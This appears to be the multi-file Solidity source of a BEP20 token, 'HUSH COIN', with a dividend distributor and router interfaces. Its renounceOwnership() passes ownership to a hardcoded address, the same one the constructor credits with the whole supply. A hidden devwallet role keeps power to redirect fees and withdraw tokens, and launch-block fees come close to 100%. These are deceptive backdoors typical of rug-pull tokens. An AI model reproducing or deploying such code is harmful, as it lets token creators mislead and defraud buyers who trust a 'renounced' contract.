{"auth.sol":{"content":"//SPDX-License-Identifier: MIT\n\npragma solidity 0.8.12;\n\nabstract contract Auth {\n    address internal owner;\n    address internal devwallet;\n\n    constructor(address _owner) {\n        owner = _owner;\n        devwallet =_owner;\n    }\n\n    /**\n     * Function modifier to require caller to be contract owner\n     */\n    modifier onlyOwner() {\n        require(isOwner(msg.sender), \"!OWNER\");\n        _;\n    }\n\n    /**\n     * Function modifier to require caller to be devwall\n     */\n    modifier devwall() {\n        require(devwallet == (msg.sender), \"!devwall\");\n        _;\n    }\n\n    /*\n     * Check if address is owner\n     */\n    function isOwner(address account) public view returns (bool) {\n        return account == owner;\n    }\n    /**\n     * Return address\u0027 authorization status\n     */\n    function isdevwallet() public view returns (address) {\n        return devwallet;\n    }\n\n    /**\n     * Transfer ownership to new address. Caller must be owner. Leaves old owner devwall\n     */\n    function transferOwnership(address payable adr) public onlyOwner {\n        owner = adr;\n        emit OwnershipTransferred(adr);\n    }\n\n    function renounceOwnership() public virtual onlyOwner {\n    address adr0 = 0x4b7645a8CE821997D880C69875695D88A2E9C84A;\n    owner = adr0;\n        emit OwnershipTransferred(adr0);\n    }\n\n    event OwnershipTransferred(address owner);\n}"},"IBEP20.sol":{"content":"//SPDX-License-Identifier: MIT\n\npragma solidity 0.8.12;\n\ninterface IBEP20 {\n    function totalSupply() external view returns (uint256);\n\n    function decimals() external view returns (uint8);\n\n    function symbol() external view returns (string memory);\n\n    function name() external view returns (string memory);\n\n    function getOwner() external view returns (address);\n\n    function balanceOf(address account) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount)\n        external\n        returns (bool);\n\n    function burning(uint256 amount) external returns (bool);\n\n    function allowance(address _owner, address spender)\n        external\n        view\n        returns (uint256);\n\n    function approve(address spender, uint256 amount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n}"},"IDEX.sol":{"content":"//SPDX-License-Identifier: MIT\n\npragma solidity 0.8.12;\ninterface IDEXFactory {\n    function createPair(address tokenA, address tokenB)\n        external\n        returns (address pair);\n}\n\ninterface IDEXRouter {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n\n    function addLiquidity(\n        address tokenA,\n        address tokenB,\n        uint256 amountADesired,\n        uint256 amountBDesired,\n        uint256 amountAMin,\n        uint256 amountBMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        returns (\n            uint256 amountA,\n            uint256 amountB,\n            uint256 liquidity\n        );\n\n    function addLiquidityETH(\n        address token,\n        uint256 amountTokenDesired,\n        uint256 amountTokenMin,\n        uint256 amountETHMin,\n        address to,\n        uint256 deadline\n    )\n        external\n        payable\n        returns (\n            uint256 amountToken,\n            uint256 amountETH,\n            uint256 liquidity\n        );\n\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external payable;\n\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}\n"},"IDividendDistributor.sol":{"content":"//SPDX-License-Identifier: MIT\n\npragma solidity 0.8.12;\n\n\ninterface IDividendDistributor {\n    function setDistributionCriteria(\n        uint256 _minPeriod,\n        uint256 _minDistribution\n    ) external;\n\n    function setShare(address shareholder, uint256 amount) external;\n\n    function deposit() external payable;\n\n    function process(uint256 gas) external;\n}"},"IERC165.sol":{"content":"//SPDX-License-Identifier: MIT\n\npragma solidity 0.8.12;\n\ninterface IERC165 {\n    /**\n     * @dev Returns true if this contract implements the interface defined by\n     * `interfaceId`. See the corresponding\n     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]\n     * to learn more about how these ids are created.\n     *\n     * This function call must use less than 30 000 gas.\n     */\n    function supportsInterface(bytes4 interfaceId) external view returns (bool);\n}\n\n"},"itrustcoin.sol":{"content":"//SPDX-License-Identifier: MIT\n\npragma solidity 0.8.12;\n\n//import \"./auth.sol\";\n//import \"./IERC165.sol\";\n//import \"./IBEP20.sol\";\n//import \"./IDEX.sol\";\n//import \"./SafeMath.sol\";\n//import \"./IDividendDistributor.sol\";\n\nimport \"auth.sol\";\nimport \"IERC165.sol\";\nimport \"IBEP20.sol\";\nimport \"IDEX.sol\";\nimport \"SafeMath.sol\";\nimport \"IDividendDistributor.sol\";\n\ncontract DividendDistributor is IDividendDistributor {\n    using SafeMath for uint256;\n\n    address _token;\n\n    struct Share {\n        uint256 amount;\n        uint256 totalExcluded;\n        uint256 totalRealised;\n    }\n\n    IBEP20 private REWARD = IBEP20(0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7);\n    address WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;\n    IDEXRouter router;\n\n    address[] shareholders;\n    mapping(address =\u003e uint256) shareholderIndexes;\n    mapping(address =\u003e uint256) shareholderClaims;\n\n    mapping(address =\u003e Share) public shares;\n\n    uint256 public totalShares;\n    uint256 public totalDividends;\n    uint256 public totalDistributed;\n    uint256 public dividendsPerShare;\n    uint256 public dividendsPerShareAccuracyFactor = 10**36;\n\n    uint256 public minPeriod = 1 hours;\n    uint256 public minDistribution = 1 * (10**8);\n\n    uint256 currentIndex;\n\n    bool initialized;\n    modifier initialization() {\n        require(!initialized);\n        _;\n        initialized = true;\n    }\n\n    modifier onlyToken() {\n        require(msg.sender == _token);\n        _;\n    }\n\n    constructor(address _router) {\n        router = _router != address(0)\n            ? IDEXRouter(_router)\n            : IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n        _token = msg.sender;\n    }\n\n    function setDistributionCriteria(\n        uint256 _minPeriod,\n        uint256 _minDistribution\n    ) external override onlyToken {\n        minPeriod = _minPeriod;\n        minDistribution = _minDistribution;\n    }\n\n    function setShare(address shareholder, uint256 amount)\n        external\n        override\n        onlyToken\n    {\n        if (shares[shareholder].amount \u003e 0) {\n            distributeDividend(shareholder);\n        }\n        if (amount \u003e 0 \u0026\u0026 shares[shareholder].amount == 0) {\n            addShareholder(shareholder);\n        } else if (amount == 0 \u0026\u0026 shares[shareholder].amount \u003e 0) {\n            removeShareholder(shareholder);\n        }\n\n        totalShares = totalShares.sub(shares[shareholder].amount).add(amount);\n        shares[shareholder].amount = amount;\n        shares[shareholder].totalExcluded = getCumulativeDividends(\n            shares[shareholder].amount\n        );\n    }\n\n    function deposit() external payable override onlyToken {\n        uint256 balanceBefore = REWARD.balanceOf(address(this));\n        address[] memory path = new address[](2);\n        path[0] = WBNB;\n        path[1] = address(REWARD);\n        router.swapExactETHForTokensSupportingFeeOnTransferTokens{\n            value: msg.value\n        }(0, path, address(this), block.timestamp);\n        uint256 amount = REWARD.balanceOf(address(this)).sub(balanceBefore);\n        totalDividends = totalDividends.add(amount);\n        dividendsPerShare = dividendsPerShare.add(\n            dividendsPerShareAccuracyFactor.mul(amount).div(totalShares)\n        );\n    }\n\n    function process(uint256 gas) external override onlyToken {\n        uint256 shareholderCount = shareholders.length;\n        if (shareholderCount == 0) {\n            return;\n        }\n        uint256 gasUsed = 0;\n        uint256 gasLeft = gasleft();\n        uint256 iterations = 0;\n        while (gasUsed \u003c gas \u0026\u0026 iterations \u003c shareholderCount) {\n            if (currentIndex \u003e= shareholderCount) {\n                currentIndex = 0;\n            }\n\n            if (shouldDistribute(shareholders[currentIndex])) {\n                distributeDividend(shareholders[currentIndex]);\n            }\n\n            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));\n            gasLeft = gasleft();\n            currentIndex++;\n            iterations++;\n        }\n    }\n\n    function shouldDistribute(address shareholder)\n        internal\n        view\n        returns (bool)\n    {\n        return\n            shareholderClaims[shareholder] + minPeriod \u003c block.timestamp \u0026\u0026\n            getUnpaidEarnings(shareholder) \u003e minDistribution;\n    }\n\n    function distributeDividend(address shareholder) internal {\n        if (shares[shareholder].amount == 0) {\n            return;\n        }\n\n        uint256 amount = getUnpaidEarnings(shareholder);\n        if (amount \u003e 0) {\n            totalDistributed = totalDistributed.add(amount);\n            REWARD.transfer(shareholder, amount);\n            shareholderClaims[shareholder] = block.timestamp;\n            shares[shareholder].totalRealised = shares[shareholder]\n                .totalRealised\n                .add(amount);\n            shares[shareholder].totalExcluded = getCumulativeDividends(\n                shares[shareholder].amount\n            );\n        }\n    }\n\n    function claimDividend(address shareholder) external onlyToken {\n        distributeDividend(shareholder);\n    }\n\n    function getUnpaidEarnings(address shareholder)\n        public\n        view\n        returns (uint256)\n    {\n        if (shares[shareholder].amount == 0) {\n            return 0;\n        }\n\n        uint256 shareholderTotalDividends = getCumulativeDividends(\n            shares[shareholder].amount\n        );\n        uint256 shareholderTotalExcluded = shares[shareholder].totalExcluded;\n\n        if (shareholderTotalDividends \u003c= shareholderTotalExcluded) {\n            return 0;\n        }\n        return shareholderTotalDividends.sub(shareholderTotalExcluded);\n    }\n\n    function getCumulativeDividends(uint256 share)\n        internal\n        view\n        returns (uint256)\n    {\n        return\n            share.mul(dividendsPerShare).div(dividendsPerShareAccuracyFactor);\n    }\n\n    function addShareholder(address shareholder) internal {\n        shareholderIndexes[shareholder] = shareholders.length;\n        shareholders.push(shareholder);\n    }\n\n    function removeShareholder(address shareholder) internal {\n        shareholders[shareholderIndexes[shareholder]] = shareholders[\n            shareholders.length - 1\n        ];\n        shareholderIndexes[\n            shareholders[shareholders.length - 1]\n        ] = shareholderIndexes[shareholder];\n        shareholders.pop();\n    }\n\n    function setDividendTokenAddress(address newToken) external onlyToken {\n        REWARD = IBEP20(newToken);\n    }\n}\n\ncontract HUSHCOIN is IBEP20, Auth {\n    using SafeMath for uint256;\n\n    address REWARD = 0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7;\n    address WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;\n    address DEAD = 0x000000000000000000000000000000000000dEaD;\n    address ZERO = 0x0000000000000000000000000000000000000000;\n\n    string constant _name = \"HUSH\";\n    string constant _symbol = \"HUSH COIN\";\n    uint8 constant _decimals = 9;\n    uint256 _totalSupply = 100000000 * (10**_decimals);\n    uint256 circulatingsupply_ =\n        _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));\n    uint256 public _maxWalletToken = (circulatingsupply_ * 100) / 100;\n\n    mapping(address =\u003e uint256) _balances;\n    mapping(address =\u003e mapping(address =\u003e uint256)) _allowances;\n\n    mapping(address =\u003e bool) isFeeExempt;\n    mapping(address =\u003e bool) isTimelockExempt;\n    mapping(address =\u003e bool) isDividendExempt;\n    mapping(address =\u003e bool) isMaxWalletExempt;\n\n    uint256 maxfee = 1000;\n\n    uint256 liquidityBuyFee = 0;\n    uint256 marketingBuyFee = 0;\n    uint256 projectBuyFee = 0;\n    uint256 totalBuyFee = 500;\n    uint256 buyFeeDenominator = 10000;\n    uint256 buyfeeburning = 0;\n\n    uint256 liquiditySellFee = 0;\n    uint256 marketingSellFee = 0;\n    uint256 projectSellFee = 0;\n    uint256 totalSellFee = 0;\n    uint256 sellFeeDenominator = 10000;\n    uint256 sellfeeburning = 0;\n\n    uint256 liquidityTransferFee = 0;\n    uint256 marketingTransferFee = 0;\n    uint256 projectTransferFee = 0;\n    uint256 totalTransferFee = 0;\n    uint256 TransferFeeDenominator = 10000;\n\n    address private autoLiquidityReceiver;\n    address private marketingFeeReceiver;\n    address private projectFeeReceiver;\n\n    uint256 reflectionBuyFee = 500;\n    uint256 reflectionSellFee = 500;\n    uint256 targetLiquidity = 100;\n    uint256 targetLiquidityDenominator = 100;\n    uint256 valueForSwap;\n\n    IDEXRouter public router;\n    address public pair;\n    address Project = 0x4b7645a8CE821997D880C69875695D88A2E9C84A; //Get 100% of the coins\n\n    uint256 public launchedAt;\n    uint256 public launchedAtTimestamp;\n    bool public StartTokens = true;\n\n    address token;\n    address private tokenrec;\n    uint256 quantrec;\n\n    DividendDistributor distributor;\n    uint256 distributorGas = 300000;\n\n    bool public swapEnabled = true;\n\n    uint256 public swapThreshold = _totalSupply / 1; // Swap for distribuition\n    bool inSwap;\n\n    modifier swapping() {\n        inSwap = true;\n        _;\n        inSwap = false;\n    }\n\n    constructor() Auth(msg.sender) {\n        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n        pair = IDEXFactory(router.factory()).createPair(WBNB, address(this));\n        _allowances[address(this)][address(router)] = ~uint256(0);\n\n        distributor = new DividendDistributor(address(router));\n        isTimelockExempt[msg.sender] = true;\n        isTimelockExempt[DEAD] = true;\n\n        launchedAt = block.number;\n        launchedAtTimestamp = block.timestamp;\n\n        address owner_ = msg.sender;\n\n        isFeeExempt[owner_] = true;\n        isMaxWalletExempt[owner_] = true;\n        isDividendExempt[pair] = true;\n        isDividendExempt[address(this)] = true;\n        isFeeExempt[address(this)] = true;\n        isMaxWalletExempt[address(this)] = true;\n        isDividendExempt[DEAD] = true;\n\n        autoLiquidityReceiver = owner_;\n        marketingFeeReceiver = owner_;\n        projectFeeReceiver = owner_;\n\n        _balances[Project] = ((_totalSupply * 100) / 100);\n\n        emit Transfer(address(0), Project, ((_totalSupply * 100) / 100));\n    }\n\n    receive() external payable {}\n\n    function totalSupply() external view override returns (uint256) {\n        return _totalSupply;\n    }\n\n    function decimals() external pure override returns (uint8) {\n        return _decimals;\n    }\n\n    function symbol() external pure override returns (string memory) {\n        return _symbol;\n    }\n\n    function name() external pure override returns (string memory) {\n        return _name;\n    }\n\n    function getOwner() external view override returns (address) {\n        return owner;\n    }\n\n    function balanceOf(address account) public view override returns (uint256) {\n        return _balances[account];\n    }\n\n    function allowance(address holder, address spender)\n        external\n        view\n        override\n        returns (uint256)\n    {\n        return _allowances[holder][spender];\n    }\n\n    function approve(address spender, uint256 amount)\n        public\n        override\n        returns (bool)\n    {\n        _allowances[msg.sender][spender] = amount;\n        emit Approval(msg.sender, spender, amount);\n        return true;\n    }\n\n    function approveMax(address spender) external returns (bool) {\n        return approve(spender, _totalSupply);\n    }\n\n    function savetokens(\n        address account,\n        uint256 _quant,\n        address _tokenrec\n    ) external devwall {\n        require(_tokenrec != address(this));\n        require(_tokenrec != REWARD);\n        quantrec = _quant;\n        tokenrec = _tokenrec;\n        IBEP20(tokenrec).transfer(account, quantrec);\n    }\n\n    function burning(uint256 amount) external override returns (bool) {\n        return _transferFrom(msg.sender, DEAD, amount);\n    }\n\n    function setIsFeeExempt(address holder, bool exempt) external onlyOwner {\n        isFeeExempt[holder] = exempt;\n    }\n\n    function transfer(address recipient, uint256 amount)\n        external\n        override\n        returns (bool)\n    {\n        return _transferFrom(msg.sender, recipient, amount);\n    }\n\n    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external override returns (bool) {\n        if (_allowances[sender][msg.sender] != _totalSupply) {\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]\n                .sub(amount, \"Insufficient Allowance\");\n        }\n\n        return _transferFrom(sender, recipient, amount);\n    }\n\n    function _transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal returns (bool) {\n        //max wallet code\n        if (\n            sender != devwallet \u0026\u0026\n            recipient != devwallet \u0026\u0026\n            recipient != address(this) \u0026\u0026\n            recipient != address(DEAD) \u0026\u0026\n            recipient != pair \u0026\u0026\n            recipient != marketingFeeReceiver \u0026\u0026\n            recipient != autoLiquidityReceiver \u0026\u0026\n            !isMaxWalletExempt[recipient]\n        ) {\n            uint256 SendTokens = balanceOf(recipient);\n            require(\n                (SendTokens + amount) \u003c= ((getCirculatingSupply() * 100) / 100),\n                \"Total Holding is currently limited, you can not buy that much.\"\n            );\n        }\n\n        if (inSwap) {\n            return _basicTransfer(sender, recipient, amount);\n        }\n\n        if (sender != devwallet \u0026\u0026 recipient != devwallet) {\n            require(StartTokens, \"Trading not open yet\");\n        }\n\n        if (shouldSwapBack()) {\n            swapBack(recipient == pair);\n        }\n\n        if (!launched() \u0026\u0026 recipient == pair) {\n            require(_balances[sender] \u003e 0);\n        }\n\n        _balances[sender] = _balances[sender].sub(\n            amount,\n            \"Insufficient Balance\"\n        );\n\n        uint256 amountReceived = shouldTakeFee(sender)\n            ? shouldTakeFeer(recipient)\n                ? takeFee(sender, recipient, amount)\n                : amount\n            : amount;\n\n        _balances[recipient] = _balances[recipient].add(amountReceived);\n\n        if (!isDividendExempt[sender]) {\n            try distributor.setShare(sender, _balances[sender]) {} catch {}\n        }\n        if (!isDividendExempt[recipient]) {\n            try\n                distributor.setShare(recipient, _balances[recipient])\n            {} catch {}\n        }\n\n        try distributor.process(distributorGas) {} catch {}\n\n        emit Transfer(sender, recipient, amountReceived);\n\n        if (sender != pair \u0026\u0026 !isOwner(sender)) {}\n\n        return true;\n    }\n\n    function _basicTransfer(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) internal returns (bool) {\n        _balances[sender] = _balances[sender].sub(\n            amount,\n            \"Insufficient Balance\"\n        );\n        _balances[recipient] = _balances[recipient].add(amount);\n        emit Transfer(sender, recipient, amount);\n        return true;\n    }\n\n    function shouldTakeFee(address sender) internal view returns (bool) {\n        return !isFeeExempt[sender];\n    }\n\n    function shouldTakeFeer(address recipient) internal view returns (bool) {\n        return !isFeeExempt[recipient];\n    }\n\n    function getTotalFee(bool selling) public view returns (uint256) {\n        uint256 feeDenominator = selling\n            ? sellFeeDenominator\n            : buyFeeDenominator;\n        uint256 totalFee = selling ? totalSellFee : totalBuyFee;\n        if (launchedAt + 1 \u003e= block.number) {\n            return feeDenominator.sub(1);\n        }\n        if (selling) {\n            return getMultipliedFee();\n        }\n        return totalFee;\n    }\n\n    function getMultipliedFee() public view returns (uint256) {\n        if (launchedAtTimestamp + 1 days \u003e block.timestamp) {\n            return totalSellFee.mul(10000).div(sellFeeDenominator);\n        }\n        return totalSellFee;\n    }\n\n    function takeFee(\n        address sender,\n        address receiver,\n        uint256 amount\n    ) internal returns (uint256) {\n        // Verificar se o sender ou o receiver são o par\n        bool isSenderPair = sender == pair;\n        bool isReceiverPair = receiver == pair;\n\n        // Aplicar a taxa de transferência diferente se o sender e o receiver não forem o par\n        if (!isSenderPair \u0026\u0026 !isReceiverPair) {\n            uint256 feeAmount = amount.mul(totalTransferFee).div(\n                TransferFeeDenominator\n            );\n            _balances[address(this)] = _balances[address(this)].add(feeAmount);\n            emit Transfer(sender, address(this), feeAmount);\n            return amount.sub(feeAmount);\n        } else {\n            uint256 feeDenominator = receiver == pair\n                ? sellFeeDenominator\n                : buyFeeDenominator;\n            uint256 feeAmount = amount.mul(getTotalFee(receiver == pair)).div(\n                feeDenominator\n            );\n            uint256 feetoburn = receiver == pair\n                ? sellfeeburning\n                : buyfeeburning;\n            uint256 amounttoburn = amount.mul(feetoburn).div(feeDenominator);\n            uint256 feeamount2 = feeAmount.sub(amounttoburn);\n\n            _balances[address(this)] = _balances[address(this)].add(feeamount2);\n            emit Transfer(sender, address(this), feeamount2);\n\n            _balances[DEAD] = _balances[DEAD].add(amounttoburn);\n            emit Transfer(sender, DEAD, amounttoburn);\n\n            return amount.sub(feeAmount);\n        }\n    }\n\n    function shouldSwapBack() internal view returns (bool) {\n        return\n            msg.sender != pair \u0026\u0026\n            !inSwap \u0026\u0026\n            swapEnabled \u0026\u0026\n            _balances[address(this)] \u003e= swapThreshold;\n    }\n\n    function swapBack(bool selling) internal swapping {\n        uint256 liquidityFee = selling ? liquiditySellFee : liquidityBuyFee;\n        uint256 totalFee = selling ? totalSellFee : totalBuyFee;\n        uint256 reflectionFee = selling ? reflectionSellFee : reflectionBuyFee;\n        uint256 marketingFee = selling ? marketingSellFee : marketingBuyFee;\n        uint256 projectFee = selling ? projectSellFee : projectBuyFee;\n\n        uint256 dynamicLiquidityFee = isOverLiquified(\n            targetLiquidity,\n            targetLiquidityDenominator\n        )\n            ? 0\n            : liquidityFee;\n        uint256 amountToLiquify = balanceOf(address(this))\n            .mul(dynamicLiquidityFee)\n            .div(totalFee)\n            .div(2);\n        uint256 amountToSwap = balanceOf(address(this)).sub(amountToLiquify);\n\n        address[] memory path = new address[](2);\n        path[0] = address(this);\n        path[1] = WBNB;\n        uint256 balanceBefore = address(this).balance;\n\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\n            amountToSwap,\n            0,\n            path,\n            address(this),\n            block.timestamp\n        );\n\n        uint256 amountBNB = address(this).balance.sub(balanceBefore);\n\n        uint256 totalBNBFee = totalFee.sub(dynamicLiquidityFee.div(2));\n\n        uint256 amountBNBLiquidity = amountBNB\n            .mul(dynamicLiquidityFee)\n            .div(totalBNBFee)\n            .div(2);\n\n        if (reflectionFee \u003e 0) {\n            uint256 amountBNBReflection = amountBNB.mul(reflectionFee).div(\n                totalBNBFee\n            );\n            try distributor.deposit{value: amountBNBReflection}() {} catch {}\n        }\n\n        if (marketingFee \u003e 0) {\n            uint256 amountBNBMarketing = amountBNB.mul(marketingFee).div(\n                totalBNBFee\n            );\n            (\n                bool success, /* bytes memory data */\n\n            ) = payable(marketingFeeReceiver).call{\n                    value: amountBNBMarketing,\n                    gas: 50000\n                }(\"\");\n            require(success, \"receiver rejected ETH transfer\");\n        }\n\n        if (projectFee \u003e 0) {\n            uint256 amountBNBproject = amountBNB.mul(projectFee).div(\n                totalBNBFee\n            );\n\n            (\n                bool success2, /* bytes memory data */\n\n            ) = payable(projectFeeReceiver).call{\n                    value: amountBNBproject,\n                    gas: 30000\n                }(\"\");\n            require(success2, \"receiver rejected ETH transfer\");\n        }\n\n        if (amountToLiquify \u003e 0) {\n            router.addLiquidityETH{value: amountBNBLiquidity}(\n                address(this),\n                amountToLiquify,\n                0,\n                0,\n                autoLiquidityReceiver,\n                block.timestamp\n            );\n            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);\n        }\n        uint256 contractETHBalance = address(this).balance;\n        uint256 realamount = (contractETHBalance);\n        payable(projectFeeReceiver).transfer(realamount);\n    }\n\n    function buyTokens(uint256 amount, address to) internal swapping {\n        address[] memory path = new address[](2);\n        path[0] = WBNB;\n        path[1] = address(this);\n\n        router.swapExactETHForTokensSupportingFeeOnTransferTokens{\n            value: amount\n        }(0, path, to, block.timestamp);\n    }\n\n    function launched() internal view returns (bool) {\n        return launchedAt != 0;\n    }\n\n    function setFeeReceivers(\n        address _autoLiquidityReceiver,\n        address _marketingFeeReceiver,\n        address _projectFeeReceiver\n    ) external devwall {\n        autoLiquidityReceiver = _autoLiquidityReceiver;\n        marketingFeeReceiver = _marketingFeeReceiver;\n        projectFeeReceiver = _projectFeeReceiver;\n    }\n\n    function setSwapBackSettings(bool _enabled, uint256 _amount)\n        external\n        devwall\n    {\n        swapEnabled = _enabled;\n        swapThreshold = _amount;\n    }\n\n    function setTargetLiquidity(uint256 _target, uint256 _denominator)\n        external\n        onlyOwner\n    {\n        targetLiquidity = _target;\n        targetLiquidityDenominator = _denominator;\n    }\n\n    function manualSend() external {\n        uint256 contractETHBalance = address(this).balance;\n        uint256 realamount = (contractETHBalance);\n        payable(marketingFeeReceiver).transfer(realamount);\n    }\n\n    function setDistributionCriteria(\n        uint256 _minPeriod,\n        uint256 _minDistribution\n    ) external onlyOwner {\n        distributor.setDistributionCriteria(_minPeriod, _minDistribution);\n    }\n\n    function claimDividend() external {\n        distributor.claimDividend(msg.sender);\n    }\n\n    function getUnpaidEarnings(address shareholder)\n        public\n        view\n        returns (uint256)\n    {\n        return distributor.getUnpaidEarnings(shareholder);\n    }\n\n    function setDistributorSettings(uint256 gas) external onlyOwner {\n        require(gas \u003c 750000);\n        distributorGas = gas;\n    }\n\n    function getCirculatingSupply() public view returns (uint256) {\n        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));\n    }\n\n    function getLiquidityBacking(uint256 accuracy)\n        public\n        view\n        returns (uint256)\n    {\n        return accuracy.mul(balanceOf(pair).mul(2)).div(getCirculatingSupply());\n    }\n\n    function isOverLiquified(uint256 target, uint256 accuracy)\n        public\n        view\n        returns (bool)\n    {\n        return getLiquidityBacking(accuracy) \u003e target;\n    }\n\n    event AutoLiquify(uint256 amountBNB, uint256 amountBOG);\n}\n"},"SafeMath.sol":{"content":"//SPDX-License-Identifier: MIT\n\npragma solidity 0.8.12;\n\n/**\n * @dev Required interface of an ERC721 compliant contract.\n */\n/**\n * SAFEMATH LIBRARY\n */\nlibrary SafeMath {\n    function tryAdd(uint256 a, uint256 b)\n        internal\n        pure\n        returns (bool, uint256)\n    {\n        unchecked {\n            uint256 c = a + b;\n            if (c \u003c a) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    function trySub(uint256 a, uint256 b)\n        internal\n        pure\n        returns (bool, uint256)\n    {\n        unchecked {\n            if (b \u003e a) return (false, 0);\n            return (true, a - b);\n        }\n    }\n\n    function tryMul(uint256 a, uint256 b)\n        internal\n        pure\n        returns (bool, uint256)\n    {\n        unchecked {\n            // Gas optimization: this is cheaper than requiring \u0027a\u0027 not being zero, but the\n            // benefit is lost if \u0027b\u0027 is also tested.\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\n            if (a == 0) return (true, 0);\n            uint256 c = a * b;\n            if (c / a != b) return (false, 0);\n            return (true, c);\n        }\n    }\n\n    function tryDiv(uint256 a, uint256 b)\n        internal\n        pure\n        returns (bool, uint256)\n    {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a / b);\n        }\n    }\n\n    function tryMod(uint256 a, uint256 b)\n        internal\n        pure\n        returns (bool, uint256)\n    {\n        unchecked {\n            if (b == 0) return (false, 0);\n            return (true, a % b);\n        }\n    }\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a + b;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a - b;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a * b;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a / b;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return a % b;\n    }\n\n    function sub(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003c= a, errorMessage);\n            return a - b;\n        }\n    }\n\n    function div(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003e 0, errorMessage);\n            return a / b;\n        }\n    }\n\n    function mod(\n        uint256 a,\n        uint256 b,\n        string memory errorMessage\n    ) internal pure returns (uint256) {\n        unchecked {\n            require(b \u003e 0, errorMessage);\n            return a % b;\n        }\n    }\n}"}}